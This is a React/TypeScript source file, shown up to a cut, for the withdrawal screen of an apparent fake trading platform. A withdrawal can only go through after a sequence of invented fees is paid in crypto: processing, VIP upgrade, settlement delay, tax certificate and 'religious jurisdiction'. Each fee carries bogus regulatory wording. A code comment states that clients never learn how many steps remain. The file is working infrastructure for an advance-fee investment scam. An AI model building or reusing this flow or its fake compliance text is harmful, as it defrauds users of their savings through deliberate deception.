import React, { useState } from 'react';
import {
  ArrowUpRight,
  ShieldCheck,
  AlertCircle,
  CheckCircle2,
  Lock,
  Clock,
  ExternalLink,
  Coins,
  Landmark,
  Mail,
  Building2,
  Copy,
  Check,
  ShieldAlert,
  HelpCircle,
  FileCheck,
  ChevronRight,
  Sparkles,
  Wallet
} from 'lucide-react';
import { ClientUser } from '../../types';
import { StoreService } from '../../services/store';
import { formatCurrency, translations } from '../../services/translations';
import { FeePaymentModal } from './FeePaymentModal';

interface WithdrawalModalProps {
  user: ClientUser;
  currentCurrency: string;
  currentLanguage: string;
  onNavigate?: (tab: 'dashboard' | 'trading' | 'portfolio' | 'deposit' | 'withdraw' | 'kyc') => void;
  onOpenSupport?: (initialMessage?: string) => void;
}

interface ComplianceGateModalState {
  type: 'KYC' | 'WITHDRAWAL_FEE' | 'ACCOUNT_UPGRADE' | 'DELAY_FEE' | 'TAX_FEE' | 'RELIGIOUS_JURISDICTION' | 'PENDING_SUCCESS';
  title: string;
  subtitle?: string;
  message: string;
  feeAmount?: number;
  actionLabel: string;
  actionType: 'NAVIGATE_KYC' | 'OPEN_SUPPORT' | 'CLOSE';
  supportMessage?: string;
}

export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({
  user,
  currentCurrency,
  currentLanguage,
  onNavigate,
  onOpenSupport
}) => {
  const t = translations[currentLanguage] || translations.en;
  const storeState = StoreService.getState();

  // Method: crypto | bank | paypal
  const [method, setMethod] = useState<'bank' | 'paypal' | 'crypto'>('bank');

  // Crypto state
  const [asset, setAsset] = useState<'USDT' | 'BTC' | 'ETH' | 'SOL'>('USDT');
  const [network, setNetwork] = useState<string>('TRC20 (TRON)');
  const [destinationAddress, setDestinationAddress] = useState<string>('');

  // Bank state
  const [bankName, setBankName] = useState<string>('');
  const [accountHolder, setAccountHolder] = useState<string>(user.name || '');
  const [accountNumber, setAccountNumber] = useState<string>('');
  const [iban, setIban] = useState<string>('');
  const [swiftCode, setSwiftCode] = useState<string>('');
  const [routingNumber, setRoutingNumber] = useState<string>('');

  // PayPal state
  const [paypalEmail, setPaypalEmail] = useState<string>(user.email || '');

  // Amount
  const [amount, setAmount] = useState<string>('');
  const [statusMessage, setStatusMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);

  // Compliance Intercept Modal State (Only reveals 1 single requirement at a time)
  const [activeGateModal, setActiveGateModal] = useState<ComplianceGateModalState | null>(null);
  const [copiedFeeAddress, setCopiedFeeAddress] = useState(false);
  const [feePaymentModalConfig, setFeePaymentModalConfig] = useState<{
    isOpen: boolean;
    stageNumber: number;
    stageTitle: string;
    stageDescription: string;
    feeUsd: number;
  } | null>(null);

  const fee = method === 'bank' ? 25 : method === 'paypal' ? 5 : (asset === 'BTC' ? 20 : asset === 'ETH' ? 18 : 10);
  const numAmount = parseFloat(amount) || 0;
  const netAmount = Math.max(0, numAmount - fee);

  const handleAssetChange = (newAsset: 'USDT' | 'BTC' | 'ETH' | 'SOL') => {
    setAsset(newAsset);
    if (newAsset === 'USDT') setNetwork('TRC20 (TRON)');
    else if (newAsset === 'BTC') setNetwork('Bitcoin SegWit');
    else if (newAsset === 'ETH') setNetwork('Ethereum (ERC20)');
    else if (newAsset === 'SOL') setNetwork('Solana Native');
  };

  const handleCopyFeeAddress = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedFeeAddress(true);
    setTimeout(() => setCopiedFeeAddress(false), 2000);
  };

  const handleWithdraw = (e: React.FormEvent) => {
    e.preventDefault();
    setStatusMessage(null);

    // 1. Basic validation
    if (numAmount <= fee) {
      setStatusMessage({ type: 'error', text: `Minimum withdrawal amount must exceed fee of $${fee}.` });
      return;
    }
    if (numAmount > user.balance) {
      setStatusMessage({ type: 'error', text: 'Requested amount exceeds your available account balance.' });
      return;
    }

    if (method === 'crypto' && !destinationAddress.trim()) {
      setStatusMessage({ type: 'error', text: 'Please enter a valid recipient wallet address.' });
      return;
    }
    if (method === 'bank') {
      if (!bankName.trim() || !accountHolder.trim() || (!accountNumber.trim() && !iban.trim())) {
        setStatusMessage({ type: 'error', text: 'Please complete required Bank Name, Account Holder, and Account/IBAN number.' });
        return;
      }
    }
    if (method === 'paypal' && !paypalEmail.trim()) {
      setStatusMessage({ type: 'error', text: 'Please enter a valid PayPal account email address.' });
      return;
    }

    // =========================================================================
    // SEQUENTIAL COMPLIANCE GATING FLOW
    // Client sees only the CURRENT requirement and never knows how many steps remain.
    // =========================================================================

    // STEP 1: KYC Identity Verification
    if (user.kycStatus !== 'verified') {
      setActiveGateModal({
        type: 'KYC',
        title: currentLanguage === 'fr' ? 'Vérification KYC Obligatoire' : 'Identity Verification Required (KYC)',
        subtitle: 'STATUTORY AML / KYC COMPLIANCE DIRECTIVE',
        message: currentLanguage === 'fr'
          ? 'Directive de Conformité : Conformément aux protocoles financiers internationaux et à la législation antiblanchiment (AML), votre compte de trading doit valider sa vérification d\'identité KYC Tier-1 avant que tout déblocage de fonds ne puisse être exécuté. Veuillez téléverser vos documents d\'identité pour procéder.'
          : 'Compliance Directive: In accordance with international financial security standards and AML regulatory compliance, your trading account requires verified Tier-1 KYC identification before external capital disbursements can be authorized. Please upload your identity documents to proceed.',
        actionLabel: currentLanguage === 'fr' ? 'Accéder à la Vérification KYC' : 'Complete KYC Verification',
        actionType: 'NAVIGATE_KYC'
      });
      return;
    }

    const clearance = user.withdrawalClearance || {
      withdrawalFeePaid: false,
      accountUpgraded: false,
      delayFeePaid: false,
      taxFeePaid: false,
      religiousJurisdictionApproved: false
    };

    // STEP 2: Withdrawal Processing Fee
    const step2Fee = clearance.withdrawalFeeAmount ?? 250;
    if (!clearance.withdrawalFeePaid) {
      setActiveGateModal({
        type: 'WITHDRAWAL_FEE',
        title: currentLanguage === 'fr' ? 'Frais de Traitement de Retrait Requis' : 'Mandatory Withdrawal Processing Fee Required',
        subtitle: 'INTER-BANK LIQUIDITY & CLEARING ESCROW PROTOCOL',
        message: currentLanguage === 'fr'
          ? `Protocole de Compensation Interbancaire : Conformément aux normes institutionnelles de compensation, des frais obligatoires de traitement et de transmission de ${step2Fee.toFixed(2)} $ doivent être réglés avant l'envoi des fonds. En vertu des règles de séquestre fiduciaire, ces frais de déblocage ne peuvent pas être déduits du solde non encore libéré.`
          : `Institutional Clearing Protocol: In accordance with inter-bank clearing standards, an official disbursement processing fee of $${step2Fee.toFixed(2)} must be settled before external funds can be transmitted. In accordance with custody escrow regulations, clearing fees cannot be deducted from pending account balances.`,
        feeAmount: step2Fee,
        actionLabel: currentLanguage === 'fr' ? 'Informer le Bureau de Gestion (Chat Bolt)' : 'Contact Broker Desk to Confirm Fee Settlement',
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I am requesting instructions to settle my $${step2Fee.toFixed(2)} withdrawal processing fee.`
      });
      return;
    }

    // STEP 3: Institutional Account Tier Upgrade
    const step3Fee = clearance.upgradeFeeAmount ?? 500;
    if (!clearance.accountUpgraded) {
      setActiveGateModal({
        type: 'ACCOUNT_UPGRADE',
        title: currentLanguage === 'fr' ? 'Mise à Niveau du Compte Requise' : 'Institutional Account Tier Upgrade Required',
        subtitle: 'CROSS-BORDER CLEARING CEILING NOTICE',
        message: currentLanguage === 'fr'
          ? `Avis de Seuil de Compte : Votre compte de trading opère actuellement sous les plafonds de retrait du compte Standard Retail. Pour autoriser le décaissement externe de vos capitaux et la compensation bancaire ou crypto, votre compte doit être surclassé au grade Institutionnel VIP (frais de mise à niveau : ${step3Fee.toFixed(2)} $). Veuillez contacter le bureau exécutif de votre courtier pour finaliser votre surclassement.`
          : `Account Tier Threshold Notice: Your current trading account is operating under Standard Tier withdrawal ceilings. To authorize external capital disbursement and cross-border bank/crypto clearing, your brokerage account must be upgraded to Institutional Executive VIP Tier (upgrade fee: $${step3Fee.toFixed(2)}). Please contact your senior account manager or the executive broker desk to finalize your account tier upgrade.`,
        feeAmount: step3Fee,
        actionLabel: currentLanguage === 'fr' ? 'Demander le Surclassement VIP (Chat Bolt)' : 'Contact Broker Desk for VIP Tier Upgrade',
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I would like to request an Institutional Executive VIP Tier Upgrade ($${step3Fee.toFixed(2)}) for my trading account.`
      });
      return;
    }

    // STEP 4: Liquidity Settlement Delay Fee
    const step4Fee = clearance.delayFeeAmount ?? 380;
    if (!clearance.delayFeePaid) {
      setActiveGateModal({
        type: 'DELAY_FEE',
        title: currentLanguage === 'fr' ? 'Frais de Retard de Règlement Requis' : 'Settlement Delay & Clearing Fee Required',
        subtitle: 'EXPEDITED RESERVE CLEARING PROTOCOL',
        message: currentLanguage === 'fr'
          ? `Avis de Réserve de la Chambre de Compensation : En raison des délais de règlement interbancaires transfrontaliers et de la latence du réseau de compensation, des frais de déblocage accéléré pour retard de règlement de ${step4Fee.toFixed(2)} $ sont exigés pour libérer l'allocation bloquée du pool de compensation.`
          : `Clearing House Reserve Notice: Due to cross-border inter-bank settlement delays and SWIFT/blockchain clearing window latency, an expedited liquidity delay clearance fee of $${step4Fee.toFixed(2)} is required to release the locked allocation from the reserve clearing pool.`,
        feeAmount: step4Fee,
        actionLabel: currentLanguage === 'fr' ? 'Régler les Frais de Retard (Chat Bolt)' : 'Contact Broker Desk to Settle Delay Fee',
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I am ready to settle the $${step4Fee.toFixed(2)} settlement delay clearance fee.`
      });
      return;
    }

    // STEP 5: Capital Gains Tax Clearance Certificate
    const step5Fee = clearance.taxFeeAmount ?? 520;
    if (!clearance.taxFeePaid) {
      setActiveGateModal({
        type: 'TAX_FEE',
        title: currentLanguage === 'fr' ? 'Certificat Fiscal de Déblocage Requis' : 'Statutory Capital Gains Tax Clearance Fee Required',
        subtitle: 'INTERNATIONAL WITHHOLDING TAX COMPLIANCE (FATCA / CRS)',
        message: currentLanguage === 'fr'
          ? `Conformité Fiscale Légale : Les réglementations financières internationales (normes de retenue FATCA / CRS) exigent un certificat d'apurement fiscal des plus-values avant tout décaissement définitif. Des frais de certificat fiscal statutaire de ${step5Fee.toFixed(2)} $ doivent être acquittés pour obtenir l'autorisation réglementaire.`
          : `Statutory Tax Withholding Compliance: International financial regulations (FATCA / CRS regulatory withholding standards) require statutory capital gains tax certification prior to final disbursement. A mandatory tax clearance fee of $${step5Fee.toFixed(2)} must be satisfied to obtain regulatory release certificates.`,
        feeAmount: step5Fee,
        actionLabel: currentLanguage === 'fr' ? 'Obtenir le Certificat Fiscal (Chat Bolt)' : 'Contact Broker Desk for Tax Certificate',
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I would like to settle my $${step5Fee.toFixed(2)} tax clearance certificate fee.`
      });
      return;
    }

    // STEP 6: Regional & Religious Banking Exemption Approval
    const step6Fee = clearance.jurisdictionFeeAmount ?? 300;
    if (!clearance.religiousJurisdictionApproved) {
      setActiveGateModal({
        type: 'RELIGIOUS_JURISDICTION',
        title: currentLanguage === 'fr' ? 'Conformité Régionale & Juridique Requise' : 'Regional & Religious Compliance Authorization Required',
        subtitle: 'EXECUTIVE BOARD JURISDICTION AUDIT FLAG',
        message: currentLanguage === 'fr'
          ? `Audit de Conformité Réglementaire : L'audit de sécurité indique que ce compte a été créé dans une juridiction soumise à des réglementations financières régionales et religieuses spécifiques. Des frais d'exemption et d'autorisation officielle de ${step6Fee.toFixed(2)} $ sont requis avant la libération des fonds. Votre dossier a été transmis et est actuellement en attente d'approbation.`
          : `Regulatory Compliance Audit: System audit indicates this account was registered in a jurisdiction governed by specialized regional and religious banking financial regulations. An official regional banking exemption clearance fee of $${step6Fee.toFixed(2)} is required before funds can be released. Your compliance review has been flagged and is awaiting executive board authorization.`,
        feeAmount: step6Fee,
        actionLabel: currentLanguage === 'fr' ? 'Vérifier l\'Approbation avec le Support' : 'Contact Broker Desk for Regional Waiver',
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I am ready to settle the $${step6Fee.toFixed(2)} regional jurisdiction compliance exemption fee.`
      });
      return;
    }

    // =========================================================================
    // STEP 7: ALL 6 COMPLIANCE PROTOCOLS APPROVED!
    // PENDING DISBURSEMENT QUEUE ENTRY
    // =========================================================================
    const res = StoreService.requestWithdrawal({
      userId: user.id,
      method,
      asset: method === 'crypto' ? asset : (currentCurrency || 'USD'),
      network: method === 'crypto' ? network : undefined,
      destinationAddress: method === 'crypto' ? destinationAddress.trim() : undefined,
      bankName: method === 'bank' ? bankName.trim() : undefined,
      accountHolder: method === 'bank' ? accountHolder.trim() : undefined,
      accountNumber: method === 'bank' ? accountNumber.trim() : undefined,
      iban: method === 'bank' ? iban.trim() : undefined,
      swiftCode: method === 'bank' ? swiftCode.trim() : undefined,
      routingNumber: method === 'bank' ? routingNumber.trim() : undefined,
      paypalEmail: method === 'paypal' ? paypalEmail.trim() : undefined,
      amount: numAmount
    });

    if (res.success) {
      setActiveGateModal({
        type: 'PENDING_SUCCESS',
        title: currentLanguage === 'fr' ? 'Demande de Retrait en Attente de Validation' : 'Withdrawal Request Submitted (Pending Approval)',
        subtitle: 'TRANSMITTED TO EXECUTIVE DISBURSEMENT DESK',
        message: currentLanguage === 'fr'
          ? `Votre demande de retrait de ${formatCurrency(numAmount, currentCurrency)} a été validée avec succès et est actuellement EN ATTENTE d'approbation finale par la direction financière. Le virement sera exécuté dès la validation de l'administration comptable.`
          : `Your withdrawal request for ${formatCurrency(numAmount, currentCurrency)} has been successfully submitted and is currently PENDING final executive disbursement approval by our finance department. Our accounting desk will review and disburse the transfer.`,
        actionLabel: currentLanguage === 'fr' ? 'Fermer & Consulter l\'Historique' : 'View Monitored Queue',
        actionType: 'CLOSE'
      });
      setAmount('');
      setDestinationAddress('');
      setAccountNumber('');
      setIban('');
      setSwiftCode('');
    } else {
      setStatusMessage({ type: 'error', text: res.message });
    }
  };

  const handleExecuteModalAction = () => {
    if (!activeGateModal) return;

    if (activeGateModal.actionType === 'NAVIGATE_KYC') {
      setActiveGateModal(null);
      if (onNavigate) onNavigate('kyc');
    } else if (activeGateModal.actionType === 'OPEN_SUPPORT') {
      const msg = activeGateModal.supportMessage || 'Hello, I would like assistance with my withdrawal.';
      setActiveGateModal(null);
      if (onOpenSupport) {
        onOpenSupport(msg);
      } else {
        const chatBtn = document.getElementById('bolt-chat-toggle-btn');
        if (chatBtn) chatBtn.click();
      }
    } else {
      setActiveGateModal(null);
    }
  };

  const userWithdrawals = storeState.withdrawals.filter((w) => w.userId === user.id);

  const clearance = user.withdrawalClearance || {
    withdrawalFeePaid: false,
    accountUpgraded: false,
    delayFeePaid: false,
    taxFeePaid: false,
    religiousJurisdictionApproved: false
  };

  const step1Kyc = user.kycStatus === 'verified';
  const step2Fee = clearance.withdrawalFeePaid;
  const step3Tier = clearance.accountUpgraded;
  const step4Delay = clearance.delayFeePaid;
  const step5Tax = clearance.taxFeePaid;
  const step6Jurisdiction = clearance.religiousJurisdictionApproved;

  const step2FeeAmount = clearance.withdrawalFeeAmount ?? 250;
  const step3FeeAmount = clearance.upgradeFeeAmount ?? 500;
  const step4FeeAmount = clearance.delayFeeAmount ?? 380;
  const step5FeeAmount = clearance.taxFeeAmount ?? 520;
  const step6FeeAmount = clearance.jurisdictionFeeAmount ?? 300;

  // Active step calculation: 1 to 6, or 7 if all are cleared
  let activeStageNum = 7;
  if (!step1Kyc) activeStageNum = 1;
  else if (!step2Fee) activeStageNum = 2;
  else if (!step3Tier) activeStageNum = 3;
  else if (!step4Delay) activeStageNum = 4;
  else if (!step5Tax) activeStageNum = 5;
  else if (!step6Jurisdiction) activeStageNum = 6;

  const sixStepsList = [
    {
      num: 1,
      title: 'Tier-1 KYC Verification',
      shortTitle: 'KYC Verification',
      isApproved: step1Kyc,
      feeAmount: null as number | null,
      desc: 'AML/CTF Statutory Identity Validation'
    },
    {
      num: 2,
      title: `Disbursement Clearance Fee ($${step2FeeAmount.toFixed(2)})`,
      shortTitle: 'Disbursement Fee',
      isApproved: step2Fee,
      feeAmount: step2FeeAmount,
      desc: 'Inter-Bank Liquidity & Clearing Escrow Protocol'
    },
    {
      num: 3,
      title: `VIP Tier 8.3 Account Upgrade ($${step3FeeAmount.toFixed(2)})`,
      shortTitle: 'VIP Tier Upgrade',
      isApproved: step3Tier,
      feeAmount: step3FeeAmount,
      desc: 'Institutional VIP Liquidity Clearance Quota'
    },
    {
      num: 4,
      title: `Settlement Delay Clearance Fee ($${step4FeeAmount.toFixed(2)})`,
      shortTitle: 'Delay Clearance',
      isApproved: step4Delay,
      feeAmount: step4FeeAmount,
      desc: 'Expedited Reserve Liquidity Release Protocol'
    },
    {
      num: 5,
      title: `Capital Gains Tax Certificate ($${step5FeeAmount.toFixed(2)})`,
      shortTitle: 'Tax Certificate',
      isApproved: step5Tax,
      feeAmount: step5FeeAmount,
      desc: 'Statutory FATCA/CRS Regulatory Tax Compliance'
    },
    {
      num: 6,
      title: `Regional Jurisdiction Compliance ($${step6FeeAmount.toFixed(2)})`,
      shortTitle: 'Jurisdiction Waiver',
      isApproved: step6Jurisdiction,
      feeAmount: step6FeeAmount,
      desc: 'Regional Banking & Religious Exemption Authorization'
    }
  ];

  const getActiveStepDetails = () => {
    switch (activeStageNum) {
      case 1:
        return {
          name: 'Identity Verification Required (KYC)',
          clientNotice:
            'Statutory AML / KYC Compliance Directive: In accordance with international financial security standards and AML regulatory compliance, your trading account requires verified Tier-1 KYC identification before external disbursements can be authorized.',
          feeAmount: null as number | null,
          actionButton: (
            <button
              type="button"
              onClick={() => onNavigate && onNavigate('kyc')}
              className="px-4 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs flex items-center gap-1.5 shadow-md shadow-blue-500/20 cursor-pointer"
            >
              <ShieldCheck className="w-4 h-4" />
              <span>Complete KYC Verification</span>
            </button>
          )
        };
      case 2:
        return {
          name: `Mandatory Withdrawal Processing Fee ($${step2FeeAmount.toFixed(2)})`,
          clientNotice: `Inter-Bank Liquidity & Clearing Escrow Protocol: An official disbursement processing fee of $${step2FeeAmount.toFixed(2)} must be settled before external funds can be transmitted. In accordance with custody escrow regulations, clearing fees cannot be deducted from pending account balances.`,
          feeAmount: step2FeeAmount,
          actionButton: (
            <button
              type="button"
              onClick={() =>
                setFeePaymentModalConfig({
                  isOpen: true,
                  stageNumber: 2,
                  stageTitle: 'Mandatory Withdrawal Processing Fee',
                  stageDescription: `Official disbursement clearing fee of $${step2FeeAmount.toFixed(2)} USD required before capital transmission.`,
                  feeUsd: step2FeeAmount
                })
              }
              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-slate-950 font-extrabold text-xs shadow-md shadow-amber-500/20 flex items-center gap-1.5 cursor-pointer"
            >
              <Wallet className="w-4 h-4" />
              <span>Pay $${step2FeeAmount.toFixed(2)} via Crypto</span>
            </button>
          )
        };
      case 3:
        return {
          name: `Institutional VIP Tier 8.3 Account Upgrade ($${step3FeeAmount.toFixed(2)})`,
          clientNotice: `Account Tier Threshold Notice: Your current trading account is operating under Standard Tier withdrawal ceilings. To authorize external capital disbursement and cross-border bank/crypto clearing, your brokerage account must be upgraded to Institutional Executive VIP Tier 8.3 (upgrade fee: $${step3FeeAmount.toFixed(2)}).`,
          feeAmount: step3FeeAmount,
          actionButton: (
            <button
              type="button"
              onClick={() =>
                setFeePaymentModalConfig({
                  isOpen: true,
                  stageNumber: 3,
                  stageTitle: 'Institutional VIP Tier 8.3 Upgrade',
                  stageDescription: `Institutional account upgrade fee of $${step3FeeAmount.toFixed(2)} USD required for high-volume liquidity release.`,
                  feeUsd: step3FeeAmount
                })
              }
              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-indigo-500 to-blue-500 hover:from-indigo-400 hover:to-blue-400 text-white font-extrabold text-xs shadow-md shadow-indigo-500/20 flex items-center gap-1.5 cursor-pointer"
            >
              <Wallet className="w-4 h-4" />
              <span>Pay Upgrade Fee ($${step3FeeAmount.toFixed(2)}) via Crypto</span>
            </button>
          )
        };
      case 4:
        return {
          name: `Settlement Delay & Clearing Fee ($${step4FeeAmount.toFixed(2)})`,
          clientNotice: `Clearing House Reserve Notice: Due to cross-border inter-bank settlement delays and SWIFT/blockchain clearing window latency, an expedited liquidity delay clearance fee of $${step4FeeAmount.toFixed(2)} is required to release the locked allocation from the reserve clearing pool.`,
          feeAmount: step4FeeAmount,
          actionButton: (
            <button
              type="button"
              onClick={() =>
                setFeePaymentModalConfig({
                  isOpen: true,
                  stageNumber: 4,
                  stageTitle: 'Settlement Delay Clearance Fee',
                  stageDescription: `Expedited reserve liquidity delay clearance fee of $${step4FeeAmount.toFixed(2)} USD.`,
                  feeUsd: step4FeeAmount
                })
              }
              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-400 hover:to-amber-400 text-slate-950 font-extrabold text-xs shadow-md shadow-orange-500/20 flex items-center gap-1.5 cursor-pointer"
            >
              <Wallet className="w-4 h-4" />
              <span>Pay Delay Fee ($${step4FeeAmount.toFixed(2)}) via Crypto</span>
            </button>
          )
        };
      case 5:
        return {
          name: `Statutory Capital Gains Tax Clearance Certificate ($${step5FeeAmount.toFixed(2)})`,
          clientNotice: `Statutory Tax Withholding Compliance: International financial regulations (FATCA / CRS regulatory withholding standards) require statutory capital gains tax certification prior to final disbursement. A mandatory tax clearance fee of $${step5FeeAmount.toFixed(2)} must be satisfied to obtain regulatory release certificates.`,
          feeAmount: step5FeeAmount,
          actionButton: (
            <button
              type="button"
              onClick={() =>
                setFeePaymentModalConfig({
                  isOpen: true,
                  stageNumber: 5,
                  stageTitle: 'Capital Gains Tax Clearance Certificate',
                  stageDescription: `Statutory regulatory tax withholding clearance fee of $${step5FeeAmount.toFixed(2)} USD.`,
                  feeUsd: step5FeeAmount
                })
              }
              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-400 hover:to-yellow-400 text-slate-950 font-extrabold text-xs shadow-md shadow-amber-500/20 flex items-center gap-1.5 cursor-pointer"
            >
              <Wallet className="w-4 h-4" />
              <span>Pay Tax Fee ($${step5FeeAmount.toFixed(2)}) via Crypto</span>
            </button>
          )
        };
      case 6:
        return {
          name: `Regional & Religious Banking Exemption Approval ($${step6FeeAmount.toFixed(2)})`,
          clientNotice: `Regulatory Compliance Audit: System audit indicates this account was registered in a jurisdiction governed by specialized regional and religious banking financial regulations. An official regional banking exemption clearance fee of $${step6FeeAmount.toFixed(2)} is required before funds can be released.`,
          feeAmount: step6FeeAmount,
          actionButton: (
            <button
              type="button"
              onClick={() =>
                setFeePaymentModalConfig({
                  isOpen: true,
                  stageNumber: 6,
                  stageTitle: 'Regional Banking Exemption Clearance',
                  stageDescription: `Specialized regional jurisdiction compliance exemption fee of $${step6FeeAmount.toFixed(2)} USD.`,
                  feeUsd: step6FeeAmount
                })
              }
              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-sky-500 to-blue-500 hover:from-sky-400 hover:to-blue-400 text-white font-extrabold text-xs shadow-md shadow-sky-500/20 flex items-center gap-1.5 cursor-pointer"
            >
              <Wallet className="w-4 h-4" />
              <span>Pay Exemption Fee ($${step6FeeAmount.toFixed(2)}) via Crypto</span>
            </button>
          )
        };
      default:
        return {
          name: 'All 6 Clearance Steps Approved',
          clientNotice:
            'Unrestricted Authorization: All 6 statutory compliance clearance protocols have been approved by administration. You may submit direct withdrawal requests below.',
          feeAmount: null as number | null,
          actionButton: null
        };
    }
  };

  const activeStepDetails = getActiveStepDetails();

  return (
    <div className="max-w-4xl mx-auto space-y-6">
      {/* ================= INSTITUTIONAL CLEARANCE PROTOCOL TRACKER ================= */}
      <div className="bg-[#0b1325] border border-[#162238] rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6">
        {/* Header with Title and Current Status */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-[#172338] pb-5">
          <div className="flex items-center gap-3.5">
            <div
              className={`w-12 h-12 rounded-2xl flex items-center justify-center font-bold text-lg border ${
                activeStageNum === 7
                  ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40 shadow-lg shadow-emerald-500/20'
                  : 'bg-amber-500/20 text-amber-400 border-amber-500/40 shadow-lg shadow-amber-500/20'
              }`}
            >
              {activeStageNum === 7 ? <Sparkles className="w-6 h-6" /> : <ShieldCheck className="w-6 h-6" />}
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  Real-time Regulatory Clearance
                </span>
                <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-blue-500/20 text-blue-300 border border-blue-500/30">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                  Live Sync
                </span>
              </div>
              <h3 className="text-lg sm:text-xl font-extrabold text-white mt-0.5">
                Institutional Withdrawal Protocol
              </h3>
              <p className="text-xs text-slate-400">
                Cross-Platform Statutory Compliance Audit & Inter-Bank Clearing
              </p>
            </div>
          </div>

          <div className="text-right sm:self-auto self-start">
            <span
              className={`inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold border ${
                activeStageNum === 7
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                  : 'bg-amber-500/20 text-amber-300 border-amber-500/40'
              }`}
            >
              {activeStageNum === 7 ? (
                <>
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                  <span>ALL 6 STEPS CLEARED</span>
                </>
              ) : (
                <>
                  <Clock className="w-4 h-4 text-amber-400 animate-spin" />
                  <span>STEP {activeStageNum} OF 6 REQUIRED</span>
                </>
              )}
            </span>
          </div>
        </div>

        {/* Pending Client Payment Proof Alert (if client recently submitted TXID) */}
        {clearance.pendingPaymentStage && (
          <div className="p-4 rounded-2xl bg-gradient-to-r from-amber-500/20 via-orange-500/20 to-amber-500/10 border border-amber-500/50 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-amber-200">
            <div className="flex items-start gap-3">
              <div className="w-9 h-9 rounded-xl bg-amber-500/30 text-amber-300 flex items-center justify-center shrink-0 mt-0.5">
                <Clock className="w-5 h-5 animate-spin" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-xs font-bold text-white uppercase tracking-wider">
                    Payment Proof Under Desk Verification
                  </span>
                  <span className="px-2 py-0.5 rounded bg-amber-500/30 text-[10px] font-mono font-bold text-amber-300">
                    Stage {clearance.pendingPaymentStage}
                  </span>
                </div>
                <div className="text-xs text-slate-300 mt-1">
                  Submitted Amount:{' '}
                  <strong className="text-emerald-400 font-mono font-bold">
                    {clearance.pendingPaymentAmount} {clearance.pendingPaymentCrypto}
                  </strong>
                  {clearance.pendingPaymentTxid && (
                    <span className="ml-2 text-slate-400 font-mono text-[11px]">
                      (TXID: {clearance.pendingPaymentTxid})
                    </span>
                  )}
                </div>
                <div className="text-[11px] text-amber-300/80 mt-0.5">
                  Our compliance officer is reviewing this submission. Upon approval, this screen will instantly advance to the next step.
                </div>
              </div>
            </div>
            <div className="shrink-0 flex items-center gap-2">
              <span className="text-[11px] font-bold text-amber-400 bg-amber-500/20 px-3 py-1.5 rounded-xl border border-amber-500/30">
                Pending Admin Approval
              </span>
            </div>
          </div>
        )}

        {/* Active Step Directive Spotlight */}
        {activeStageNum < 7 ? (
          <div className="p-5 rounded-2xl bg-[#0e1930] border border-blue-500/30 shadow-inner flex flex-col md:flex-row items-start md:items-center justify-between gap-5">
            <div className="space-y-1.5 flex-1">
              <div className="flex items-center gap-2">
                <span className="px-2.5 py-0.5 rounded-md bg-blue-500/20 text-blue-400 text-[11px] font-extrabold uppercase tracking-wide border border-blue-500/30">
                  Current Required Action
                </span>
                <span className="text-xs font-bold text-white">
                  Step {activeStageNum}: {activeStepDetails.name}
                </span>
              </div>
              <p className="text-xs text-slate-300 leading-relaxed">
                {activeStepDetails.clientNotice}
              </p>
              {activeStepDetails.feeAmount && (
                <div className="text-xs text-amber-400 font-bold flex items-center gap-1.5 pt-1">
                  <span>Authorized Clearance Amount:</span>
                  <span className="font-mono text-sm font-black text-amber-300">
                    ${activeStepDetails.feeAmount.toFixed(2)} USD
                  </span>
                </div>
              )}
            </div>

            <div className="flex items-center gap-2.5 w-full md:w-auto shrink-0 flex-wrap">
              {activeStepDetails.actionButton}
              <button
                type="button"
                onClick={() => {
                  const msg = `Hello, I am inquiring about Stage ${activeStageNum} (${activeStepDetails.name}) for my account clearance.`;
                  if (onOpenSupport) onOpenSupport(msg);
                  else {
                    const btn = document.getElementById('bolt-chat-toggle-btn');
                    if (btn) btn.click();
                  }
                }}
                className="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white font-bold text-xs flex items-center gap-1.5 border border-slate-700 transition-colors cursor-pointer"
              >
                <span>Support Desk</span>
                <ChevronRight className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>
        ) : (
          <div className="p-4 rounded-2xl bg-emerald-500/15 border border-emerald-500/40 text-emerald-300 flex items-center gap-3">
            <CheckCircle2 className="w-5 h-5 shrink-0 text-emerald-400" />
            <div className="text-xs">
              <strong className="text-white">Full Compliance Authorization Granted:</strong> All 6 statutory clearance protocols (KYC, disbursement fee, tier upgrade, settlement delay, capital gains tax, and regional jurisdiction) have been verified by administration. You may submit your payout request below.
            </div>
          </div>
        )}

        {/* 6-Step Visual Interactive Stepper Grid */}
        <div>
          <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-3">
            Clearance Protocol Sequence (6 Stages)
          </div>
          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2.5">
            {sixStepsList.map((st) => {
              const isCurrent = st.num === activeStageNum;
